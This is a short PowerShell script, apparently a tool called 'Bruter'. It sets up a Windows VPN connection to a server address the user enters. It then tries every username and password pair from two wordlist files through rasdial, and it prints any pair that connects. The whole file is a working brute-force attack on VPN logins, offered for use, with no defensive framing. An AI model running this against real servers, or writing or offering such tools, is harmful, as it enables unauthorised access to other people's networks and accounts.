$Checkvpn = Get-VpnConnection
if ($Checkvpn.ConnectionStatus -cmatch 'Connected' -eq $true ){

echo '!!Your Connected By Your Bruter Connection First Disconnect!!'
return}


elseif ($Checkvpn.Name -match 'Bruter' -eq $true)

{
$VPNType = Read-host "Vpn_Server_Address "
$TunType = Read-host "Your Tunnel Typee ( Pptp | L2tp | Ikev2 | Automatic (Not Sstp) ) "

Set-VpnConnection -Name Bruter -ServerAddress $VPNType -TunnelType $TunType
#'!!!Your Vpn Has Built Before Its Named Bruter You Can Change Your Config In [ControlPanel\Network and Internet\Network Connections]!!!'
}
else
{
$VPNType = Read-host "Vpn_Server_Address "
$TunType = Read-host "Your Tunnel Typee ( Pptp | L2tp | Ikev2 | Automatic (Not Sstp) ) "

Add-VpnConnection -name Bruter -ServerAddress $VPNType -TunnelType $TunType

}

$UFP = Read-host "[+]Username_File_path "
$PFP = Read-host "[+]Password_File_path "
$username = cat $UFP
$password = cat $PFP
for ($x=0;$x -le $username.count; $x++)
{
    $listuser =  $username[$x]
  
     for($y=0;$y -le $password.count; $y++)
           {
             $listpass = $password[$y]
             
            
               [string]$Connection =  rasdial "Bruter" $listuser $listpass
                            
                                        
                 if ($Connection -match 'error' -eq $true )
            
                     {echo "$listuser [+] $listpass NO!!"}
             
                 else
            
                     {echo '  YES !!!!!Your Username & Password Found!!!!!  '
                     echo [+]username: $username[$x]
                     echo [+]password: $password[$y]
                     exit}

        }

}   

